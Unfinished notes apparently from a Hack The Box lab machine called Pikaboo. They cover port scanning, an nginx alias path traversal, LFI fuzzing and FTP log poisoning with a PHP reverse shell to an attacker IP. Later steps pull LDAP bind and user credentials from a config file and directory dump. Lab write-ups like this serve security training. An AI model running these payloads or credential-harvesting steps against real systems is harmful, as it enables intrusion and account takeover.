### Nmap 
```text
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17e113fe666d26b69068d030542ee29f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAgG6pLBPMmXneLGYurX9xbt6cE2IYdEN9J/ijCVrQbpUyVeTNWNoFnpB8+DIcppOtsJu0X3Iwpfb1eTmuop8q9nNlmyOcOTBHYOYLQwa+G4e90Bsku86ndqs+LU09sjqss5n3XdZoFqunNfZb7EirVVCgI80Lf8F+3XRRIX3ErqNrk2LiaQQY6fcAaNALaQy9ked7KydWDFYizO2dnu8ee2ncdXFMBeVDKGVfrlHAoRFoTmCEljCP1Vsjt69NDBudCGJBgU1MbItTF7DtbNQWGQmw8/9n9Jq8ic/YxOnIKRDDUuuWdE3sy2dPiw0ZVuG7V2GnkkMsGv0Qn3Uq9Qx7
|   256 928654f7cc5a1a15fec609cce57c0dc3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIJl6Z/XtGXJwSnO57P3CesJfRbmGNra4AuSSHCGUocKchdp3JnNE704lMnocAevDwi9HsAKARxCup18UpPHz+I=
|   256 f4cd6f3b199ccf33c66da5136a610142 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINyHVcrR4jjhBG5vZsvKRsKO4SnXj3GqeMtwvFSvd4B4
80/tcp open  http    syn-ack nginx 1.14.2
|_http-title: Pikaboo
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### Web Enum and exploit
```bash
# found /admin.php and /admin../ return 403 instead of 401
# Alias LFI Misconfiguration
# perform dir enum on /admin../FUZZ and found server-status
http://10.10.10.249/admin../server-status

# found interesting page is hosted in admin_staging
127.0.0.1 localhost:81 GET /admin_staging HTTP/1.1

# be redirected to a new interface
http://10.10.10.249/admin../admin_staging/index.php?page=user.php

# found LFI
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u $URL../../../../../../../FUZZ --hw 1049
/var/log/vsftpd.log

# posion log file
telnet $IP 21
<?php $sock=fsockopen("10.10.14.19",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
```

### Priv Esc
```bash
# ref: https://0xdf.gitlab.io/2021/12/04/htb-pikaboo.html

-rwxr-sr-x 1 root incron 103K Dec  2  2019 /usr/bin/incrontab (Unknown SGID binary)



cat /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done

# check /opt/pokeapi/ as /usr/local/bin/csvupdate was using it
# found cred from /opt/pokeapi/config/settings.py
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}

# check port 389 is running normally its ldap
netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      532/nginx: worker p 
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      532/nginx: worker p 
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

# enum ldap
ldapsearch -h 127.0.0.1 -x -s base namingcontexts -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g'
ldapsearch -h 127.0.0.1 -x -b 'dc=htb' -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g'
# extended LDIF
#
# LDAPv3
# base <dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb
dn: dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: htb
dc: htb

# admin, htb
dn: cn=admin,dc=htb
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9bWxhdFNUTzJDZjZ6QjdVL2VyOVBUamtBVE5yZnJiVnE=

# users, htb
dn: ou=users,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, htb
dn: ou=groups,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, pikaboo.htb
dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# pokeapi.pikaboo.htb
dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

# users, pokeapi.pikaboo.htb
dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, pokeapi.pikaboo.htb
dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# search result
search: 2
result: 0 Success


# decode cred
admin:{SSHA}mlatSTO2Cf6zB7U/er9PTjkATNrfrbVq
"pwnmeow:_G0tT4_C4tcH_'3m_4lL!_"
binduser:J~42%W?PFHl]g

# "pwnmeow:_G0tT4_C4tcH_'3m_4lL!_" can be used to login through ftp but cannot put file
can access type dir to put

# TO BE CONTINURE....



```
